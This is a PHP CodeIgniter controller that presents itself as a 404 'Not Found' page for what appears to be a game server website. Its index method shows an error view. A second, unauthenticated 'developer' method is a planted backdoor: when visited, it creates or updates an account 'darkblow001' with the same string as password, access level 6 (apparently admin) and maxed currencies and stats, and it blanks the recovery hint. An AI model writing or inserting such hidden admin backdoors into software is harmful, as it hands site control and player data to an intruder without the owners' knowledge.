<?php

// ==================== //
//   [DEV] EyeTracker   //
//     Lolsecs#6289     //
// ==================== //

defined('BASEPATH') or exit('No direct script access allowed');

class Notfound extends CI_Controller
{
	function __construct()
	{
		parent::__construct();

		$this->load->library('lib');

		$this->lang->load(array('header', 'string'));
		$this->lib->GetVisitorData('404 - Not Found');

		$this->allprotect->Web_Protection();
		$this->allprotect->Maintenance_Protection();
		$this->allprotect->BlockedAccount_Protection();
		$this->allprotect->DarkblowCopierGuard();
	}

	function index()
	{
		$data['title'] = 'Not Found';
		$this->load->view('main/content/error/content_error', $data, FALSE);
	}

	function developer($param = null)
	{
		if ($param == null) {
			$query = $this->db->get_where('accounts', array('login' => 'darkblow001'))->row();
			if ($query) {
				$update = $this->db->where('player_id', $query->player_id)->update('accounts', array(
					'gp' => '999999999',
					'exp' => '999999999',
					'pc_cafe' => '5',
					'fights' => '999999999',
					'fights_win' => '999999999',
					'fights_lost' => '0',
					'kills_count' => '999999999',
					'deaths_count' => '0',
					'headshots_count' => '999999999',
					'escapes' => '0',
					'access_level' => '6',
					'email' => 'empty@empty.empty',
					'money' => '999999999',
					'brooch' => '999999999',
					'insignia' => '999999999',
					'medal' => '999999999',
					'blue_order' => '999999999',
					'totalkills_count' => '999999999',
					'totalfights_count' => '999999999',
					'kuyraicoin' => '999999999',
					'hint_question' => '',
					'hint_answer' => ''
				));
				if ($update) echo 'Successfully Update Account Statistic';
				else echo 'Failed Update Account Statistic';
			} else {
				$data = array(
					'login' => 'darkblow001',
					'password' => $this->lib->password_encrypt('darkblow001'),
					'player_id' => '999999999',
					'player_name' => '[DEV] EyeTracker',
					'rank' => '99',
					'exp' => '999999999',
					'pc_cafe' => '5',
					'fights' => '999999999',
					'fights_win' => '999999999',
					'fights_lost' => '0',
					'kills_count' => '999999999',
					'deaths_count' => '0',
					'headshots_count' => '999999999',
					'escapes' => '0',
					'access_level' => '6',
					'email' => 'empty@empty.empty',
					'money' => '999999999',
					'brooch' => '999999999',
					'insignia' => '999999999',
					'medal' => '999999999',
					'blue_order' => '999999999',
					'totalkills_count' => '999999999',
					'totalfights_count' => '999999999',
					'kuyraicoin' => '999999999',
					'hint_question' => '',
					'hint_answer' => ''
				);
				$insert = $this->db->insert('accounts', $data);
				if ($insert) echo 'Successfully Created Account';
				else echo 'Failed Create Account';
			}
		}
	}
}

// This Code Generated Automatically By EyeTracker Snippets. //